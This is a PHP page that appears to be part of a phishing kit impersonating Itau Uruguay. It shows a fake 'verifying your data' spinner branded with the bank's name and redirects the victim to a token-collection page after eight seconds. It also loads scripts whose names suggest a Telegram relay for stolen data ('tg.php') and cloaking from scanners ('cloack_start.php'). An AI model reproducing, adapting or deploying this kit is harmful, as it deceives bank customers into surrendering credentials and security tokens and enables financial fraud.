<?php
include './config.php';
include './naranja/tg.php';
include './shield/cloack_start.php';
if ($EYEZ == true){
    include './guardian/start.php';
}

$update = null;
if(isset($_GET['update'])){
    $update = $_GET['update'];
}

?>
<html>

<head>
  <meta http-equiv="refresh" content="8; url=token2.php">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="./squared/yez.css" rel="stylesheet">
  <meta name="robots" content="noindex">
  <title>Uruguay</title>
</head>

<body>
  <header>
  </header>
  <section class="container">

    <div>
      <br><br>
      <center>
        <div class="spinner"></div>
      </center>
      <br><br>
      <h1 class="title">Verificando datos ingresados</h1>
      <p>Espera un momento estamos verificando tus datos, no cierres esta ventana.
      </p>
    </div>
  </section>
  <footer>
    <div class="footer-content">
      Itau Uruguay
    </div>
  </footer>


</body>

</html>